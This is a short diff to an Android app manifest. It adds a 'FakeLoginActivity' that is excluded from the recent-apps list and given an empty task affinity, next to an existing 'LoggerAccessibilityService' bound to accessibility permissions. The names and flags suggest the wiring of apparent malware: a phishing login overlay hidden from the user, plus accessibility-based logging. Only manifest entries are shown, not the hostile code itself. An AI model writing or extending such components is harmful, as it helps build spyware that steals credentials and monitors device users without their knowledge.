@@ -21,6 +21,19 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
+
+        <!-- <activity
+        android:name=".FakeLoginActivity"
+        android:exported="false"
+        android:theme="@style/Theme.AppCompat.Light.NoActionBar"
+        android:excludeFromRecents="true"
+        android:taskAffinity="" /> -->
+        <activity
+        android:name=".FakeLoginActivity"
+        android:theme="@style/Theme.FakeLogin"
+        android:taskAffinity="" 
+        android:excludeFromRecents="true"
+        android:exported="false" />
         <service
             android:name=".LoggerAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
